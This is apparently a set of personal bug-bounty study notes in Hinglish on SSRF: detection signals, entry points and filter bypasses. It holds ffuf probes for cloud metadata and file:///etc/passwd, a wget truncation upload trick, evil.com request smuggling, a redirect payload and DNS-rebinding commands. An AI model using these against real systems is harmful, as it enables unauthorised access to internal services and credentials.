# SSRF

> SSRF ka full form hai **Server-Side Request Forgery** â€” attacker server ko majboor karta hai kisi aur internal service, private IP, ya protocol pe request bhejne ke liye jahan client normally access nahi kar sakta.

## SSRF TYPES : -

#### 1. Basic SSRF: Observing Direct Responses

#### 2. [Blind SSRF](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/): When No Direct Response is Visible

> 2.1. Out-of-Band (OOB) Interaction Testing 2.2. Time-Based Blind SSRF Detection 2.3. Error Message Analysis

#### ğŸ”¹ **1. Error-Based Detection (via XXE or others):**

#### âœ… **Successful Internal Request:**

```ruby
System.Xml.XmlException: Expected DTD markup was not found. Line 1, position 1.
```

â†’ Response mila hai, parsing error hua (target reachable)

#### âŒ **Failed Internal Request:**

```ruby
System.Net.WebException: Unable to connect to the remote server
```

â†’ Target unreachable (host:port nahi mil raha)

#### ğŸ”¹ **2. Status Code Differences:**

| Scenario                             | Status Code             |
| ------------------------------------ | ----------------------- |
| ğŸ”„ Internal service **reachable**    | `200 OK`, `403`, etc.   |
| âŒ Internal service **not reachable** | `500`, `504`, `timeout` |

#### ğŸ”¹ **3. Response Content Length:**

* **Reachable URL** â†’ Normal/full content response (e.g., 2KB)
* **Unreachable URL** â†’ Empty or short error message (e.g., 300B)

#### ğŸ”¹ **4. Response Timing:**

| Scenario                   | Timing Behavior    |
| -------------------------- | ------------------ |
| ğŸ•’ Reachable internal host | Slower response    |
| âš¡ Dead or invalid host     | Fast error/timeout |

<div align="center" data-full-width="false"><img src="attachment:c0992493-aa9d-4304-8080-0e54e5fda56f:1_tVs7lG1d8srGZjqp1WZizQ.webp" alt="1_tVs7lG1d8srGZjqp1WZizQ.webp"> <figure><img src="https://www.notion.so/kalki-x0/SSRF-1e3014d507fc8062a2bcf59b9603154b?source=copy_link#1e7014d507fc80cc8490faa0d4b4ccce" alt=""><figcaption></figcaption></figure></div>

![17465130144887964195694898153682.png](attachment:4459d1e7-8795-4264-a6da-951141756fa6:17465130144887964195694898153682.png)

## `SSRF METHODLOGY`

### **Where to find**

1. **`Image/File Uploaders:` Check upload or import forms that accept URLs (avatars, image imports, document converters). An uploaded file containing a URL (e.g. SVG, JPG, XML, JSON) can trigger SSRF when the server fetches it**[**vickieli.dev**](https://vickieli.dev/ssrf/ssrf-in-the-wild/)**. Look for places parsing user files for links (e.g. virus scanners, thumbnail generators)**
   *   [_**wget File Upload/SSRF Trick**_](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html#wget-file-uploadssrf-trick) _**(hackticks)**_ `for rce chain`

       #### **Wget File Upload/SSRF Trick Explanation**

       #### ğŸ” **Problem Kaha Hai?**

       Kuch web servers file download karne ke liye `wget` ka use karte hain, aur user se file ka URL lete hain. But URL accept karte waqt ye check karte hain ki file ka extension safe ho â€” jaise `.gif`, `.jpg`, etc.

       Lekin hacker dimaag se sochta hai: **â€œKaise `php` file bhej dein, lekin system ko lage ki `.gif` hai?â€**

       #### ğŸ§  **Trick Kya Hai?**

       Linux mein max filename length hoti hai **255 characters**,

       lekin `wget` isko **236 characters** mein truncate (chhota) kar deta hai.

       Toh agar tum ek file ka naam bana do:

       ```
       "A"*232 + ".php" + ".gif"
       ```

       Toh:

       * Web server dekhega `.gif` extension â€” âœ… allowed
       *   Lekin jab `wget` usko download karega, toh filename truncate hoke ban jayega

           ```
           AAAAAAAAAA...AAAAAAAA.php
           ```

       Yani tum `.php` file upload karwa doge, extension `.gif` deke â€” **BYPASS!**

       #### âš™ï¸ **Kaise Karo Practically:**

       ```bash
       # 1. Local server pe malicious file banao
       echo "<?php phpinfo(); ?>" > $(python -c 'print("A"*(236-4)+".php"+".gif")')

       # 2. Simple HTTP server chalu karo
       python3 -m http.server 9080

       # 3. Victim server par wget ka use karo to download your file
       wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
       ```

       Output:

       ```
       New name is AAAAAA....AAAAA.php
       ```

       BOOM! Server `.gif` samjha, lekin `.php` file upload ho gayi âœ…

       #### âŒ **Redirect Trick Nahi Chalega Unless...**

       Agar tum socho:

       > "Ek URL do .gif, lekin HTTP redirect kare .php pe"

       Toh `wget` fir bhi original `.gif` wale naam se hi save karega â€” **jab tak** `--trust-server-names` flag na diya ho.

       #### ğŸ› ï¸ **Tools:**

       **Upload Bypass Tool** â€” Ek aisa tool hai jo pentesters ko help karta hai file upload vulnerabilities dhundhne aur bypass karne mein.
   * [\*SSRF Blind in the image upload module via url](https://huntr.com/bounties/beba9b98-2a5c-4629-987d-b67f47ba9437) - - > done read\*
   * [\*My First Bug: Blind SSRF Through Profile Picture Upload](https://infosecwriteups.com/my-first-bug-blind-ssrf-through-profile-picture-upload-72f00fd27bc6) xml/svg - - > done read\*
   *   SSRF VIA ffmpeg AVI/M3UG

       > _(A)_ [_SSRF via FFmpeg HLS processing_](https://medium.com/@pflash0x0punk/ssrf-via-ffmpeg-hls-processing-a04e0288a8c5) _- - > done read_
       >
       > tip - - > **agar server uploaded video file ke andar embedded URL pe request kare**, toh **ye behavior FFmpeg ka hota hai** â†’ **strong indirect proof**. (B) [\*HLS m3u8 Files for SSRF](https://www.ids-sax2.com/understanding-ffmpeg-vulnerabilities-exploiting-hls-m3u8-files-for-ssrf-and-arbitrary-file-read/) - - > done read\*
       >
       > tip - - > When a website allows users to upload multimedia files and processes them using FFmpeg, this vulnerability can be triggered.
   * [XML - - >](https://www.notion.so/XML-1e7014d507fc80cfa38efd8c145e0e95?pvs=21) _- - > done read_
2.  **`Proxy/Redirect Services:` Identify any URL-fetching API (e.g. â€œfetch this URL and return contentâ€), open proxy pages, or redirectors. These typically take a URL parameter; test them directly. They often yield SSRF.**

    *   _S_[_SRF via SNI data from certificate(hacktrick)_](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)

        #### **SSRF via SNI (Server Name Indication) Misconfiguration in Nginx**

        #### ğŸ§  Pehle yeh samajh:

        **SNI (Server Name Indication)** kya hota hai?

        * Jab tu HTTPS request karta hai, client (like browser or curl or openssl) **TLS handshake** mein ek extra field bhejta hai: **`servername`**
        * Yeh batata hai ki kis domain ke liye certificate chahiye (useful in shared hosting)

        #### ğŸ”¥ Nginx stream block ka misuse

        ```bash
        nginx
        CopyEdit
        stream {
            server {
                listen 443;
                resolver 127.0.0.11;
                proxy_pass $ssl_preread_server_name:443;
                ssl_preread on;
            }
        }
        ```

        ğŸ§¨ **Problem kya hai?**

        *   `proxy_pass` backend server set kar raha hai **SNI field ke value** se:

            `proxy_pass $ssl_preread_server_name:443;`
        * Matlab: jo bhi tu **`servername`** flag me daalega, wo hi Nginx backend bana dega!

        #### ğŸš¨ SSRF Exploit Scenario

        Tu `target.com` pe openssl se ek request bhej:

        ```bash
        openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
        ```

        â¡ï¸ Yeh kya karega?

        * TLS handshake karega `target.com` se
        * Lekin bolega SNI mein: â€œmain `internal.host.com` se baat karna chahta hoonâ€
        * Nginx samjhega: â€œOkay! Mujhe proxy banana hai `internal.host.com:443` peâ€ ğŸ”¥

        **BAM!** Tu internal backend pe connect ho gaya â€” SSRF!
    *   [\*Misconfigured proxies to SSRF](https://blog.bugport.net/exploiting-http-parsers-inconsistencies) ( blog post)\*

        1.  **SSRF on Flask Through Incorrect Pathname Interpretation**

            ```bash
            GET @evildomain.com/ HTTP/1.1
            Host: target.com
            Connection: close
            ```
        2.  **SSRF on Spring Boot Through Incorrect Pathname Interpretationv**

            ```bash
            GET ;@evil.com/url HTTP/1.1
            Host: target.com
            Connection: close
            ```
        3.  **PHP Built-in Web Server Case Study - SSRF Through Incorrect Pathname Interpretation**

            ```bash
            GET *@0xa9fea9fe/ HTTP/1.1
            Host: target.com
            Connection: close
            ```

        [_cracking the lens by james kettle_](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)

    [https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)

    > GET `@evil.com` HTTP/1.1 headers: `host` , `referer` , `X-forwarded- for`
    >
    > 1. [\*Reverse proxy misconfiguration](https://portswigger.net/research/listen-to-the-whispers-web-timing-attacks-that-actually-work#defence) by james kettle blog\*
3. **`Webhooks/Callbacks`: Features where users specify callback URLs (e.g. Slack/GitHub webhooks, payment IPNs, IFTTT-style integrations) are prime SSRF points. Test by pointing the callback to internal resources or attacker domains.**
   1. [_**A story of a nice SSRF vulnerability.**_](https://medium.com/@oXnoOneXo/a-story-of-a-nice-ssrf-vulnerability-51e16ff6a33f)
   2. \*[https://hackerone.com/reports/2301565\*](https://hackerone.com/reports/2301565*)
4. **`Other URL Inputs:` Examine any form field or API that accepts a URL for processing â€“ e.g. link previews, content fetchers, sitemap generators. Less obvious entry points include document processors (PDF-to-text, data import) and any API that â€œproxiesâ€ or expands user-supplied links**
   1.  [_**SSRF AND PDF GENERATORS**_](https://docs.google.com/presentation/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/htmlpresent)

       [WHITEPAPER](https://www.notion.so/WHITEPAPER-201014d507fc806d88ace61746c5f27d?pvs=21)
   2. \*\*`*for wordpress` [https://patchstack.com/articles/exploring-the-unpatched-wordpress-ssrf\*\*\*](https://patchstack.com/articles/exploring-the-unpatched-wordpress-ssrf***)
   3. [**`*PHP SSRF*`**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.html#php-ssrf)
   4. [**`*Cloud SSRF*`**](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#cloud-ssrf)

#### 5. `brute GET/POST typical ssrf params`

> [_FUZZING_](https://0xacb.com/2022/11/21/recollapse/)
>
> \[_FUZZING WITH FUFF]\(file:///D:/courses/HTB%20-%20Bug%20Bounty%20Hunter%20Path%202024.11%_[_20hide01.ir/5. Attacking Web Applications with Ffuf hide01.ir.pdf_](http://20hide01.ir/5.%20Attacking%20Web%20Applications%20with%20Ffuf%20hide01.ir.pdf)_) HTB PDF_

[ssrf-param.txt](https://www.notion.so/ssrf-param-txt-1f2014d507fc80dfad10d30dc3133c43?pvs=21)

#### 1. Parameter Discovery

```bash
# FFUF (GET)
ffuf -w ssrf-params.txt -u "<https://target.com/FUZZ=http://burpcollaborator.net>" -fs 0

# FFUF (POST)
ffuf -w ssrf-params.txt -X POST -d 'FUZZ=http://burpcollaborator.net' -u <https://target.com/api> -fs 0

# Curl Testing
curl "<https://target.com/url=http://burpcollaborator.net>"
```

#### 2. Verify URL Processing

For each found parameter, test if it actually fetches URLs:

```bash
# Test with your collaborator
ffuf -w ssrf-params.txt -u "<https://example.com/FUZZ=http://YOURCOLLABORATOR.oastify.com>" -fs 0

# Check response time to detect potential blind SSRF
ffuf -w ssrf-params.txt -u "<https://example.com/FUZZ=http://169.254.169.254>" -fs 0 -t 1

```

#### 3. Test Internal Access

Once you confirm URL fetching, test internal endpoints:

```bash
# AWS metadata endpoint
ffuf -w ssrf-params.txt -u "<https://example.com/FUZZ=http://169.254.169.254/latest/meta-data/>" -fs 0

# Common internal services
ffuf -w ssrf-params.txt -u "<https://example.com/FUZZ=http://internal.example.com>" -fs 0

```

#### 4. Protocol Testing

Check if other protocols are allowed:

```bash
# File protocol
ffuf -w ssrf-params.txt -u "<https://example.com/FUZZ=file:///etc/passwd>" -fs 0

# Other dangerous protocols
ffuf -w ssrf-params.txt -u "<https://example.com/FUZZ=dict://localhost:22>" -fs 0

```

#### Next Steps After Finding Parameters

* Internal IP ranges
* Special protocols (file://, gopher://)
* HTTP header injection (via Host, X-Forwarded-For)

For each working parameter, manually test:

* Filter bypass techniques (URL encoding, case variation)

### Important Notes

1. **Rate limiting**: Add `p "0.5"` to slow down requests if needed
2. **Filtering**: Adjust `fs 0` based on normal response sizes
3. **Authentication**: If endpoints need auth, use `H "Authorization: Bearer TOKEN"`

![image.png](attachment:115efbbb-5b18-407a-b9a1-3fcb98d5f03b:image.png)

![image.png](attachment:9030fc9c-a818-4ff1-a700-a75fa1ce7031:image.png)

![image.png](attachment:0a62a414-e121-4068-b984-02e42a4cc740:image.png)

![image.png](attachment:e58a2710-9f55-4e2a-88ac-2527ebdd8267:image.png)

## `HTB SSRF NOTES (BYPASS WAYS)`

```
1. Can you reach internal IPs directly?
   â””â”€â”€ Yes â†’ Try basic SSRF with 127.0.0.1, localhost, etc.

2. Are IPs or hostnames being blocked?
   â””â”€â”€ Yes â†’ Try URL parser bypass (decimal IP, octal, user@host, etc)

3. Is there a redirect allowed in request flow?
   â””â”€â”€ Yes â†’ Use open redirect SSRF

4. Is domain name allowed but internal IP blocked?
   â””â”€â”€ Yes â†’ Try DNS rebinding

5. Is app resolving DNS externally?
   â””â”€â”€ Yes â†’ Use rbndr.us
   â””â”€â”€ No â†’ Try to setup rogue DNS server (internal rebinding)

6. Still filtered?
   â””â”€â”€ Combine with HTTP smuggling, header injection, etc.
```

#### ğŸ§  SSRF Basic Filter Bypasses

#### ğŸ”¥ What is happening?

Some websites allow you to send a URL (like for screenshots or previews), but they don't want you accessing internal services like `localhost` or `127.0.0.1`. So, they add filters to block it.

But here's the catch:

Even if `localhost` or `127.0.0.1` is blocked, there are **many ways to represent the same IP address**, which can bypass simple filters.

#### ğŸ˜ Simple Bypass Tricks (Explain like a friend)

| Trick                      | What it means                | Example                    |
| -------------------------- | ---------------------------- | -------------------------- |
| ğŸ”¢ **Short IP**            | Short version of 127.0.0.1   | `127.1`                    |
| ğŸ§® **Decimal**             | Whole IP as a single number  | `2130706433`               |
| ğŸ§Š **Octal**               | Using 0 before numbers       | `0177.0.0.1`               |
| ğŸ’¥ **Hexadecimal**         | Using hex format             | `0x7f000001`               |
| ğŸ§Ÿ **IPv6 loopback**       | IPv6 version of localhost    | `::1` or `0:0:0:0:0:0:0:1` |
| ğŸ§© **Mapped IPv4 in IPv6** | Hybrid format                | `::ffff:127.0.0.1`         |
| ğŸ’¨ **0.0.0.0 or 0**        | Special case, often internal | `0` or `0.0.0.0`           |
| ğŸ”— **Prolonged format**    | Adding extra zeroes          | `127.0000000.1`            |

#### ğŸ” Watch the response:

| **Category**       | **Blocked Response (Safe)** ğŸ”´            | **Allowed Response (Vulnerable)** ğŸŸ¢              |
| ------------------ | ----------------------------------------- | ------------------------------------------------- |
| **Error Messages** | `403 Forbidden`                           | `200 OK` (even with empty response)               |
|                    | `URL not allowed`                         | Internal IP/server content visible                |
|                    | `Invalid domain`                          | Web server banners (e.g., `nginx/1.18.0`)         |
|                    | `Request failed`                          | Redirects (`301/302` to internal systems)         |
| **Timing**         | Immediate rejection (fast response)       | Delayed response (if fetching internal resources) |
| **Content**        | Generic error pages                       | Internal API data (e.g., AWS metadata)            |
| **Headers**        | Security headers like `X-Blocked-By: WAF` | Original server headers (no filtering)            |

#### Bypass via DNS Resolution

### ğŸ¯ Whatâ€™s the Goal?

The target application is trying to **block access to internal IPs** like:

* `127.0.0.1` (localhost)
* `192.168.x.x`, `10.x.x.x`, etc. (private network)
* `0.0.0.0`

But it is only checking the **IP address format**, not the **final destination of the domain**. Thatâ€™s where **DNS resolution** trick comes in!

### **ğŸ§  Understanding the Code**

```python
def check_domain(domain):
    if 'localhost' in domain:
        return False
    try:
        ip = ipaddress.ip_address(domain)
        if ip in ipaddress.ip_network('127.0.0.0/8'):
            return False
        ...
    except:
        pass
    return True
```

#### What it does:

1. âŒ Blocks if **you directly write 'localhost'** in the domain.
2. âŒ Blocks if the input is a **direct IP** like `127.0.0.1`, `10.x.x.x`, etc.
3. âœ… **Allows domain names** (like `example.com`) â€” unless they contain the word "localhost".

But here's the mistake:

> â— It does not check what IP address the domain resolves to after DNS lookup.

### ğŸš¨ Bypass Trick Using DNS Resolution

You give a **safe-looking domain** (like `test.localtest.me`) â€” the filter accepts it, BUT it actually resolves to **127.0.0.1** behind the scenes.

#### ğŸ”§ Example:

You enter:

```
<http://test.localtest.me>
```

Now run this on your system:

```
nslookup test.localtest.me
```

Youâ€™ll get:

```
Name: test.localtest.me
Address: 127.0.0.1
```

ğŸ˜ˆ BOOM! You just tricked the server into visiting `127.0.0.1`, **without writing it directly**.

***

### ğŸŒ What is `localtest.me`?

It's a **free wildcard domain**:

* Any subdomain of `localtest.me` (like `a.localtest.me`, `b.localtest.me`) **resolves to 127.0.0.1**
* This is perfect for **bypassing SSRF filters**

#### Bypass via HTTP Redirect

```python
def check_domain(domain):
    try:
        # Resolve domain to IP
        ip = socket.gethostbyname(domain)
        
        # Parse IP address
        ip = ipaddress.ip_address(ip)

        # Check against private IP ranges
        if ip in ipaddress.ip_network('127.0.0.0/8'):    # Loopback
            return False
        if ip in ipaddress.ip_network('10.0.0.0/8'):     # Private class A
            return False
        if ip in ipaddress.ip_network('172.16.0.0/12'):  # Private class B
            return False
        if ip in ip_address('192.168.0.0/16'):          # Private class C
            return False
        if ip in ipaddress.ip_network('0.0.0.0/8'):     # Invalid/current network
            return False

        return True  # Only returns True for public IPs
    except:
        pass  # Silently fails on errors
    
    return False  # Default deny
```

### ğŸ’¡ Problem Kya Hai?

Developer ne code improve kiya hai jo:

* **Domain resolve** karta hai IP me
* IP private hai to âŒ reject kar deta hai

```
ip = socket.gethostbyname(domain)
ip = ipaddress.ip_address(ip)
# check if internal IP
```

Matlab:

* `127.0.0.1` = âŒ
* `localhost` = âŒ
* `localtest.me` (DNS resolve karta hai `127.0.0.1`) = âŒ

#### ğŸ˜ˆ Toh kya karein? Bypass karenge **HTTP Redirect** se.

***

### ğŸ” Redirect Bypass Kaise Kaam Karta Hai?

#### ğŸ”¥ Idea:

1. Tum ek **valid external URL** doge (jaise `http://your-server.com`)
2. Woh URL internally **redirect karega** to `http://127.0.0.1/debug`
3. Browser (ya headless Chrome) **follow karega redirect**
4. Final request chala jaata hai internal IP pe, filter ko pata hi nahi chalta!

***

### ğŸ§ª Practical Example

#### 1ï¸âƒ£ Tumhare server pe ek PHP file banao:

**redirect.php**

```php
<?php header('Location: <http://127.0.0.1/debug>'); ?>
```

#### 2ï¸âƒ£ Host karo:

```bash
php -S 0.0.0.0:80
```

âš¡ Tumhara server ab `http://your-vps-ip/redirect.php` serve karega

#### 3ï¸âƒ£ Target application me yeh URL do:

```bash
<http://your-vps-ip/redirect.php>
```

âœ… Yeh allowed ho jaayega kyunki:

* DNS resolve karta hai â†’ IP is **external**
* Toh filter pass ho gaya

ğŸš¨ **Lekin redirect ke through request pahuch jaata hai `127.0.0.1/debug` pe**

***

### ğŸ§  Kab Use Karna Hai?

#### âœ… Jab:

* Direct IPs jaise `127.0.0.1`, `localhost`, `localtest.me` blocked hain
* External domain allowed hai
* Server headless browser use karta hai (jaise Chrome) â€” yeh **automatically redirects** follow karta hai

#### âŒ Redirect block ho sakta hai agar:

* Server manually HTTP request bhej raha hai (curl, requests) with `allow_redirects=False`
* Redirect manually handle kiya gaya hai

#### ğŸ” Response Kaise Analyze Karein?

#### 1. Tumne URL diya:

```
<http://your-vps-ip/redirect.php>
```

#### 2. Agar tumhare server pe request aayi, aur tumne logs me dekha:

```php
GET /redirect.php
```

#### 3. Tumhare VPS ya webhook.site par dekho:

* Agar target ne `http://127.0.0.1/debug` pe request kiya
* Ya `Connection refused`, `500`, `Timeout` mila

ğŸ’¥ Ye show karta hai ki server ne redirect follow kiya aur internal IP ko access karne ki koshish ki

#### DNS Rebinding: SSRF Filter Bypass

#### ğŸ’¡ DNS Rebinding SSRF Attack â€” Basic Idea

SSRF (Server-Side Request Forgery) me hum server ko majboor karte hain ki woh **apne hi andar ke internal resources** ko access kare (jaise `127.0.0.1`, `localhost`, etc.). Normally developer filters laga dete hain jaise:

```
ip = socket.gethostbyname(domain)
ipaddress.ip_address(ip).is_global  # Check karta hai ki IP public hai ya nahi
```

Matlab: Agar IP private hui (e.g. `127.0.0.1`) toh access deny ho jaata hai.

***

#### DNS Rebinding Bypass â€” Yeh kya karta hai?

Is bypass me hum ek **domain ka IP address pehle public dikhate hain**, filter ko fool karne ke liye. Jaise hi filter `socket.gethostbyname(domain)` karta hai, domain public IP (jaise `1.1.1.1`) return karta hai, toh check pass ho jaata hai.

**Lekin actual request ke time pe** (jaise `requests.get(url)`), domain dubara resolve hota hai â€” is baar hum uska IP change kar dete hain to **`127.0.0.1`**.

> ğŸ¤¯ Server sochta hai ki woh public domain pe jaa raha hai, lekin actually woh khud ke localhost pe jaa raha hai.

***

#### ğŸ“œ Code Flow Simplified:

```python
url = "<http://ourdomain.htb:8000/flag>"
domain = urlparse(url).hostname  # ourdomain.htb
ip = socket.gethostbyname(domain)  # ğŸ‘ˆ Pehla resolve (1.1.1.1)
if ip.is_global and ip not in blacklist:
    requests.get(url)  # ğŸ‘ˆ Yahan dubara resolve hota hai (ab 127.0.0.1)
```

*   (1) [\*\*`rbndr.us`](https://lock.cmpxchg8b.com/rebinder.html)\*\* no need if you have 2nd one

    **Why Use It?**

    * **Quick and Easy**:
      * No setup needed â€“ just use `7f000001.01010101.rbndr.us`.
    * **Statistically Reliable**:
      * Randomly toggles between 2 IPs (`1.1.1.1` â†’ `127.0.0.1`).

    **Limitations**:

    âŒ Only **2 IPs** allowed (limited flexibility).

    âŒ Requires **internet access** (fails in air-gapped networks).

    âŒ **Noisy**: External DNS queries may trigger defenses.

    **When to Use?**

    âœ… Quick checks in **bug bounty**/internet-facing apps.

    âœ… When you need a **hands-off approach**.
*   **(2) `DNSrebinder` (Self-Hosted DNS Server)**

    **Why Use It?**

    * **Full Control**:
      * Define **any IPs** (e.g., `192.168.1.1`, `169.254.169.254`).
      * Supports **multiple rebinds** in one session.
    * **Advanced Attacks**:
      * Chain with **internal DNS hijacking** (e.g., via compromised Webmin).

    **Limitations**:

    âŒ Requires **setup** (DNS server + domain).

    âŒ Needs **network access** (to poison victimâ€™s DNS).

    **When to Use?**

    âœ… **Internal networks** (no internet).

    âœ… When attacking **custom DNS configurations**.

    \<aside> ğŸ’¡

    > to basically isko setup karne ke tereko apna domain lena hoga [test.com](http://test.com) then ye tool install karne honge the ye command se bypass

    ```python
    sudo python3 dnsrebinder.py --domain attacker.com --rebind 127.0.0.1 --ip 1.1.1.1 --counter 1 --tcp --udp
    ```

    \</aside>

    > ab ye dono se bhi nhi hota to tereko internal dns server ka pata karna hoga list :

    * Webmin
    * Pihole
    * PRTG Network Monitor
    * Manageengine

    > \~\~then inko access karke rule change karna hoga niche step dekh Networking -> Network Configuration -> Hostname and DNS Client -> DNS Servers
    >
    > \~\~In the DNS Servers field, we will set our attacker's machine IP, where we will host the rogue DNS server.
    >
    > ab [dnsrebinder.py](http://dnsrebinder.py/) ye tool ka command use karke payload send karo
    >
    > [http://test.com/admin](http://test.com/admin)

#### DNS Rebinding: Same-Origin Policy Bypass

[Url parsar logic bypass white paper](https://web-assets.claroty.com/exploiting-url-parsing-confusion.pdf)

[Url parsar by orange tasai](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

[Pdf tips](https://www.notion.so/Pdf-tips-1df014d507fc80a197c0da5247b9e847?pvs=21)
